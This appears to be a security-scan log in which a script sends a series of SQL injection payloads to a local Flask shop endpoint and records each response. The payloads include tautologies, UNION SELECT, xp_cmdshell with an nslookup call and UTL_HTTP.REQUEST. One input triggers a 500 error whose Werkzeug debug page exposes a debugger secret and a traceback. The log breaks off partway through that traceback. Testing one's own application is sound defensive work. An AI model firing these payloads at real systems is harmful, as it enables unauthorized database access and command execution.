[INFO]00:18:11:045-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "or 0=0 --\n"}}
[INFO]00:18:11:046-caseScan.py:113 >> code: 403
[INFO]00:18:11:046-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:077-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or 0=0 #\n"}}
[INFO]00:18:11:077-caseScan.py:113 >> code: 403
[INFO]00:18:11:078-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:108-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": " or 0=0 #\"\n"}}
[INFO]00:18:11:108-caseScan.py:113 >> code: 403
[INFO]00:18:11:109-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:140-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "or 0=0 #\n"}}
[INFO]00:18:11:140-caseScan.py:113 >> code: 403
[INFO]00:18:11:141-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:171-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or 1=1--\n"}}
[INFO]00:18:11:172-caseScan.py:113 >> code: 403
[INFO]00:18:11:172-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:202-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\" or 1=1--\n"}}
[INFO]00:18:11:203-caseScan.py:113 >> code: 403
[INFO]00:18:11:203-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:234-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or '1'='1'--\n"}}
[INFO]00:18:11:235-caseScan.py:113 >> code: 403
[INFO]00:18:11:235-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:266-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or 1 --'\n"}}
[INFO]00:18:11:266-caseScan.py:113 >> code: 403
[INFO]00:18:11:267-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:303-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "or 1=1--\n"}}
[INFO]00:18:11:304-caseScan.py:113 >> code: 403
[INFO]00:18:11:304-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:334-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "or%201=1\n"}}
[INFO]00:18:11:335-caseScan.py:113 >> code: 403
[INFO]00:18:11:336-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:366-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "or%201=1 --\n"}}
[INFO]00:18:11:367-caseScan.py:113 >> code: 403
[INFO]00:18:11:367-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:398-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or 1=1 or ''='\n"}}
[INFO]00:18:11:399-caseScan.py:113 >> code: 403
[INFO]00:18:11:399-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:429-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": " or 1=1 or \"\"=\n"}}
[INFO]00:18:11:429-caseScan.py:113 >> code: 403
[INFO]00:18:11:430-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:460-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or a=a--\n"}}
[INFO]00:18:11:460-caseScan.py:113 >> code: 403
[INFO]00:18:11:461-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:491-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": " or a=a\n"}}
[INFO]00:18:11:491-caseScan.py:113 >> code: 403
[INFO]00:18:11:492-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:522-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "') or ('a'='a\n"}}
[INFO]00:18:11:523-caseScan.py:113 >> code: 403
[INFO]00:18:11:523-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:554-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": ") or (a=a\n"}}
[INFO]00:18:11:555-caseScan.py:113 >> code: 403
[INFO]00:18:11:556-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:586-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "hi or a=a\n"}}
[INFO]00:18:11:586-caseScan.py:113 >> code: 403
[INFO]00:18:11:587-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:618-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "hi or 1=1 --\"\n"}}
[INFO]00:18:11:618-caseScan.py:113 >> code: 403
[INFO]00:18:11:619-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:650-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "hi' or 1=1 --\n"}}
[INFO]00:18:11:651-caseScan.py:113 >> code: 403
[INFO]00:18:11:652-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:682-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "hi' or 'a'='a\n"}}
[INFO]00:18:11:682-caseScan.py:113 >> code: 403
[INFO]00:18:11:683-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:714-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "hi') or ('a'='a\n"}}
[INFO]00:18:11:715-caseScan.py:113 >> code: 403
[INFO]00:18:11:716-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:747-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\"hi\"\") or (\"\"a\"\"=\"\"a\"\n"}}
[INFO]00:18:11:748-caseScan.py:113 >> code: 403
[INFO]00:18:11:749-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:779-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'hi' or 'x'='x';\n"}}
[INFO]00:18:11:779-caseScan.py:113 >> code: 403
[INFO]00:18:11:780-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:811-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "@variable\n"}}
[INFO]00:18:11:811-caseScan.py:113 >> code: 403
[INFO]00:18:11:812-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:844-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": ",@variable\n"}}
[INFO]00:18:11:845-caseScan.py:113 >> code: 403
[INFO]00:18:11:846-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:877-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "PRINT\n"}}
[INFO]00:18:11:878-caseScan.py:113 >> code: 403
[INFO]00:18:11:879-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:912-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "PRINT @@variable\n"}}
[INFO]00:18:11:913-caseScan.py:113 >> code: 403
[INFO]00:18:11:913-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:945-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "select\n"}}
[INFO]00:18:11:946-caseScan.py:113 >> code: 403
[INFO]00:18:11:946-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:11:977-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "insert\n"}}
[INFO]00:18:11:977-caseScan.py:113 >> code: 403
[INFO]00:18:11:978-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:009-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "as\n"}}
[INFO]00:18:12:009-caseScan.py:113 >> code: 403
[INFO]00:18:12:010-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:040-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "or\n"}}
[INFO]00:18:12:041-caseScan.py:113 >> code: 403
[INFO]00:18:12:041-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:073-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "procedure\n"}}
[INFO]00:18:12:073-caseScan.py:113 >> code: 403
[INFO]00:18:12:074-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:104-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "limit\n"}}
[INFO]00:18:12:105-caseScan.py:113 >> code: 403
[INFO]00:18:12:106-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:136-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "order by\n"}}
[INFO]00:18:12:137-caseScan.py:113 >> code: 403
[INFO]00:18:12:137-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:167-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "asc\n"}}
[INFO]00:18:12:168-caseScan.py:113 >> code: 403
[INFO]00:18:12:168-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:199-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "desc\n"}}
[INFO]00:18:12:200-caseScan.py:113 >> code: 403
[INFO]00:18:12:200-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:231-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "delete\n"}}
[INFO]00:18:12:231-caseScan.py:113 >> code: 403
[INFO]00:18:12:232-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:262-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "update\n"}}
[INFO]00:18:12:263-caseScan.py:113 >> code: 403
[INFO]00:18:12:263-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:294-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "distinct\n"}}
[INFO]00:18:12:295-caseScan.py:113 >> code: 403
[INFO]00:18:12:295-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:328-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "having\n"}}
[INFO]00:18:12:328-caseScan.py:113 >> code: 403
[INFO]00:18:12:329-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:361-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "truncate\n"}}
[INFO]00:18:12:361-caseScan.py:113 >> code: 403
[INFO]00:18:12:362-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:394-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "replace\n"}}
[INFO]00:18:12:394-caseScan.py:113 >> code: 403
[INFO]00:18:12:395-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:426-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "like\n"}}
[INFO]00:18:12:427-caseScan.py:113 >> code: 403
[INFO]00:18:12:427-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:457-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "handler\n"}}
[INFO]00:18:12:458-caseScan.py:113 >> code: 403
[INFO]00:18:12:459-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:489-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "bfilename\n"}}
[INFO]00:18:12:490-caseScan.py:113 >> code: 403
[INFO]00:18:12:491-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:520-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or username like '%\n"}}
[INFO]00:18:12:521-caseScan.py:113 >> code: 403
[INFO]00:18:12:521-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:552-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or uname like '%\n"}}
[INFO]00:18:12:552-caseScan.py:113 >> code: 403
[INFO]00:18:12:553-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:584-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or userid like '%\n"}}
[INFO]00:18:12:584-caseScan.py:113 >> code: 403
[INFO]00:18:12:585-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:615-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or uid like '%\n"}}
[INFO]00:18:12:616-caseScan.py:113 >> code: 403
[INFO]00:18:12:617-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:645-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or user like '%\n"}}
[INFO]00:18:12:645-caseScan.py:113 >> code: 403
[INFO]00:18:12:646-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:675-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "exec xp\n"}}
[INFO]00:18:12:676-caseScan.py:113 >> code: 403
[INFO]00:18:12:676-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:706-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "exec sp\n"}}
[INFO]00:18:12:706-caseScan.py:113 >> code: 403
[INFO]00:18:12:707-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:735-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'; exec master..xp_cmdshell\n"}}
[INFO]00:18:12:736-caseScan.py:113 >> code: 403
[INFO]00:18:12:736-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:765-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'; exec xp_regread\n"}}
[INFO]00:18:12:765-caseScan.py:113 >> code: 403
[INFO]00:18:12:766-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:794-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "t'exec master..xp_cmdshell 'nslookup www.google.com'--\n"}}
[INFO]00:18:12:794-caseScan.py:113 >> code: 403
[INFO]00:18:12:795-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:827-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "--sp_password\n"}}
[INFO]00:18:12:828-caseScan.py:113 >> code: 403
[INFO]00:18:12:828-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:858-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "\\x27UNION SELECT\n"}}
[INFO]00:18:12:858-caseScan.py:113 >> code: 403
[INFO]00:18:12:859-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:888-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' UNION SELECT\n"}}
[INFO]00:18:12:889-caseScan.py:113 >> code: 403
[INFO]00:18:12:889-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:920-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' UNION ALL SELECT\n"}}
[INFO]00:18:12:920-caseScan.py:113 >> code: 403
[INFO]00:18:12:921-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:950-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or (EXISTS)\n"}}
[INFO]00:18:12:950-caseScan.py:113 >> code: 403
[INFO]00:18:12:951-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:12:979-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' (select top 1\n"}}
[INFO]00:18:12:980-caseScan.py:113 >> code: 403
[INFO]00:18:12:981-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:009-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'||UTL_HTTP.REQUEST\n"}}
[INFO]00:18:13:010-caseScan.py:113 >> code: 403
[INFO]00:18:13:010-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:089-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "1;SELECT%20*\n"}}
[INFO]00:18:13:090-caseScan.py:113 >> code: 500
[INFO]00:18:13:090-caseScan.py:114 >> response: <!doctype html>
<html lang=en>
  <head>
    <title>pymysql.err.OperationalError: (1292, &#34;Truncated incorrect DOUBLE value: &#39;1;SELECT%20*\n&#39;&#34;)
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "f14cIhWZsCFSqB7Czdcp";
    </script>
  </head>
  <body style="background-color: #fff">
    <div class="debugger">
<h1>OperationalError</h1>
<div class="detail">
  <p class="errormsg">pymysql.err.OperationalError: (1292, &#34;Truncated incorrect DOUBLE value: &#39;1;SELECT%20*\n&#39;&#34;)
</p>
</div>
<h2 class="traceback">Traceback <em>(most recent call last)</em></h2>
<div class="traceback">
  <h3></h3>
  <ul><li><div class="frame" id="frame-1754719178464">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">2213</em>,
      in <code class="function">__call__</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">    </span>def __call__(self, environ: dict, start_response: t.Callable) -&gt; t.Any:</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;The WSGI server calls the Flask application object as the</pre>
<pre class="line before"><span class="ws">        </span>WSGI application. This calls :meth:`wsgi_app`, which can be</pre>
<pre class="line before"><span class="ws">        </span>wrapped to apply middleware.</pre>
<pre class="line before"><span class="ws">        </span>&#34;&#34;&#34;</pre>
<pre class="line current"><span class="ws">        </span>return self.wsgi_app(environ, start_response)
<span class="ws">        </span>       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre></div>
</div>

<li><div class="frame" id="frame-1754719179904">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">2193</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line before"><span class="ws">                </span>response = self.full_dispatch_request()</pre>
<pre class="line before"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line before"><span class="ws">                </span>error = e</pre>
<pre class="line current"><span class="ws">                </span>response = self.handle_exception(e)
<span class="ws">                </span>           ^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre>
<pre class="line after"><span class="ws">                </span>raise</pre>
<pre class="line after"><span class="ws">            </span>return response(environ, start_response)</pre>
<pre class="line after"><span class="ws">        </span>finally:</pre></div>
</div>

<li><div class="frame" id="frame-1754719179472">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">2190</em>,
      in <code class="function">wsgi_app</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>ctx = self.request_context(environ)</pre>
<pre class="line before"><span class="ws">        </span>error: BaseException | None = None</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>try:</pre>
<pre class="line before"><span class="ws">                </span>ctx.push()</pre>
<pre class="line current"><span class="ws">                </span>response = self.full_dispatch_request()
<span class="ws">                </span>           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">            </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">                </span>error = e</pre>
<pre class="line after"><span class="ws">                </span>response = self.handle_exception(e)</pre>
<pre class="line after"><span class="ws">            </span>except:  # noqa: B001</pre>
<pre class="line after"><span class="ws">                </span>error = sys.exc_info()[1]</pre></div>
</div>

<li><div class="frame" id="frame-1754719177600">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">1486</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line before"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line before"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line current"><span class="ws">            </span>rv = self.handle_user_exception(e)
<span class="ws">            </span>     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre>
<pre class="line after"><span class="ws">        </span>self,</pre>
<pre class="line after"><span class="ws">        </span>rv: ft.ResponseReturnValue | HTTPException,</pre></div>
</div>

<li><div class="frame" id="frame-1754719181488">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">1484</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line current"><span class="ws">                </span>rv = self.dispatch_request()
<span class="ws">                </span>     ^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre></div>
</div>

<li><div class="frame" id="frame-1754719178320">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\flask\app.py"</cite>,
      line <em class="line">1469</em>,
      in <code class="function">dispatch_request</code></h4>
